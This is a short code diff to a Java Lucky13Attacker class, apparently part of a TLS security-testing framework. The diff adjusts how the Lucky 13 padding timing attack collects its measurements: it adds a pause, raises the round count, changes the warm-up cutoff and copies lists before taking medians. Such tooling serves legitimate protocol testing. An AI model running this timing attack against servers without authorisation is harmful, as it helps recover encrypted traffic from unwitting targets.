@@ -113,6 +113,11 @@ public class Lucky13Attacker extends Attacker<Lucky13CommandConfig> {
         } catch (IOException e) {
             LOGGER.warn(e.getMessage());
         }
+        try {
+            Thread.sleep(10);
+        } catch (InterruptedException e) {
+
+        }
     }
 
     private Record createRecordWithPadding(int p, CipherSuite suite) {
@@ -163,7 +168,7 @@ public class Lucky13Attacker extends Attacker<Lucky13CommandConfig> {
             for (int i = 0; i < paddingStrings.length; i++) {
                 paddings[i] = Integer.parseInt(paddingStrings[i]);
             }
-            for (int i = 0; i < config.getMeasurements(); i++) {
+            for (int i = 0; i < ((int) config.getMeasurements() * 1.25); i++) {
                 LOGGER.info("Starting round {}", i);
                 for (int p : paddings) {
                     Record record = createRecordWithPadding(p, suite);
@@ -173,7 +178,7 @@ public class Lucky13Attacker extends Attacker<Lucky13CommandConfig> {
                         results.put(p, new LinkedList<Long>());
                     }
                     // remove the first 20% of measurements
-                    if (i > config.getMeasurements() / 5) {
+                    if (i > (config.getMeasurements() / 4) - 1) {
                         results.get(p).add(lastResult);
                     }
                 }
@@ -181,7 +186,7 @@ public class Lucky13Attacker extends Attacker<Lucky13CommandConfig> {
 
             StringBuilder medians = new StringBuilder();
             for (int padding : paddings) {
-                List<Long> rp = results.get(padding);
+                List<Long> rp = (List) ((LinkedList) results.get(padding)).clone();
                 Collections.sort(rp);
                 LOGGER.info("Padding: {}", padding);
                 long median = rp.get(rp.size() / 2);
